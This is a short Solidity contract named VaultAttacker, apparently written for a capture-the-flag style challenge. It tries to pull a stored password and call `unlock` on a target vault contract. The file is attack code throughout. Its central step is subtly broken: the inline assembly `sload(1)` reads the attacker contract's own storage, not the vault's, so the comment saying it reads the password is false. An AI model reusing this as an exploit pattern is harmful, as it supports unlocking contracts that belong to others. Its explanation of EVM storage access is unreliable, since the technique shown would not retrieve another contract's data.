pragma solidity ^0.8.0;

interface IVault {
    function unlock(bytes32 _password) external;
}

contract VaultAttacker {
    IVault vault;

    constructor(address vaultAddress) {
        vault = IVault(vaultAddress);
    }

    event Password(bytes32 password); // Debug event

    function extractPassword() public returns (bytes32) {
        bytes32 password;
        assembly {
            password := sload(1) // Read password
        }
        emit Password(password);
        return password;
    }

    function attack() public {
        bytes32 password = extractPassword();
        vault.unlock(password);
    }
}